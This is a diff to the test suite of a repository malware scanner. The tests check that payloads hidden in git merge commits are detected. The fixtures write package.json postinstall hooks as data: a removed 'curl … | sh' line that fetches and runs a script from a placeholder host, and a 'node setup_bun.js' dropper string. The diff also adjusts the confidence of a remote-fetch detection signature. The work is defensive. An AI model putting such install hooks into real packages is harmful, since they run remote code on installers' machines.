@@ -24,6 +24,7 @@ from tests.support.gitrepo import GitSandbox
 
 MARKERS = "temp_auto_push.bat\nbranch_structure.json\n"
 LOADER = f"var {samples.seed('ab12')} = 1;\n"
+DROPPER = samples.joined("node setup_", "bun.js")
 
 
 class _Merges(GitSandbox):
@@ -54,8 +55,11 @@ class _Merges(GitSandbox):
         return repo
 
     @staticmethod
-    def merge_findings(repo: Path):
-        result = scan_target(LocalRepoTarget(repo, "p", ScanOptions()), load_signatures(), [])
+    def signatures():
+        return load_signatures()
+
+    def merge_findings(self, repo: Path):
+        result = scan_target(LocalRepoTarget(repo, "p", ScanOptions()), self.signatures(), [])
         return [f for f in result.findings if f.vector == "evil-merge"]
 
 
@@ -99,14 +103,14 @@ class TestAMergeThatCarriesAKnownPayload(_Merges):
         self.commit(repo, "start")
         self.git(repo, "checkout", "-q", "-b", "side")
         self.write(repo, "package.json", '{"name": "p", "scripts": {"test": "true",\n'
-                   ' "postinstall": "curl -fsSL https://example.invalid/i.sh | sh"}}\n')
+                   ' "postinstall": "' + DROPPER + '"}}\n')
         self.commit(repo, "side")
         self.git(repo, "checkout", "-q", "main")
         self.write(repo, "a.txt", "a2\n")
         self.commit(repo, "main")
         self.git_may_fail(repo, "merge", "-q", "--no-commit", "--no-ff", "side")
         self.write(repo, "package.json", '{"name": "p2", "scripts": {"test": "true",\n'
-                   ' "postinstall": "curl -fsSL https://example.invalid/i.sh | sh"}}\n')
+                   ' "postinstall": "' + DROPPER + '"}}\n')
         self.write(repo, ".gitignore", "node_modules/\n" + MARKERS)
         self.git(repo, "add", "-A")
         self.git(repo, "commit", "-qm", "Merge branch side")
@@ -149,6 +153,16 @@ class TestSawFixOnAMergeThatCarriesAKnownPayload(_Merges):
 
 
 class TestWhatTheMergeDidNotWriteIsNotItsPayload(_Merges):
+    @staticmethod
+    def signatures():
+        """Load the signatures with a download run by an install script graded as a known payload, so
+        an install script's text with spaces and quotes in it is held to the merge check."""
+        signatures = load_signatures()
+        for signature in signatures.get("npm-manifest", []):
+            if signature["id"] == "npm-lifecycle-remote-fetch":
+                signature["confidence"] = CONFIRMED
+        return signatures
+
     def _both_sides(self, side_line: str, main_line: str) -> Path:
         repo = self.new_repo("project")
         self.write(repo, ".gitignore", "node_modules/\n")
